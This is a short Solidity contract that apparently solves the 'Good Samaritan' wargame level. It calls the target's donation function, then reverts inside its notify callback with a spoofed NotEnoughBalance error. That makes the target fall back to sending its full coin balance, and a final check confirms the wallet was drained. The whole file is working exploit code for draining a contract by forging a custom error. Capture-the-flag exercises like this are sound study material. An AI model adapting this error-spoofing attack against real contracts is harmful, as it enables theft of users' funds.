// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
    function coin() external view returns (address);
}

interface ICoin {
    function balances(address) external view returns (uint256);
}

contract AttackGoodSamaritan {
    error NotEnoughBalance();

    IGoodSamaritan private immutable target;
    ICoin private immutable coin;

    constructor(IGoodSamaritan _target) {
        target = _target;
        coin = ICoin(_target.coin());
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function hack() external {
        target.requestDonation();
        require(coin.balances(address(this)) == 10 ** 6, "Failed to drain wallet");
    }
}
